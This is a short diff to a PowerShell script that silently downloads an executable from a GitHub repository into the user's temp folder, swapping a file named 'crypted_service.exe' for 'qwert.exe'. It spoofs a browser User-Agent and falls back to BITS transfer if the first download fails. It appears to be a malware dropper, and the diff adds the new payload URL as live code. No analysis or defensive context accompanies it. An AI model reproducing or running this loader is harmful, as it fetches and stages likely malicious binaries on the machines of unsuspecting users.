@@ -1,7 +1,7 @@
 $ErrorActionPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=3072
-$u='https://raw.githubusercontent.com/iendjd7-lgtm/10.10/refs/heads/main/crypted_service.exe'
-$p=Join-Path $env:TEMP 'crypted_service.exe'
+$u='https://github.com/iendjd7-lgtm/10.10/raw/refs/heads/main/qwert.exe'
+$p=Join-Path $env:TEMP 'qwert.exe'
 $b=$null
 try{$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$b=$w.DownloadData($u)}catch{}
 if(-not $b -or $b.Length -lt 100000){try{Start-BitsTransfer -Source $u -Destination $p;$b=[IO.File]::ReadAllBytes($p)}catch{}}
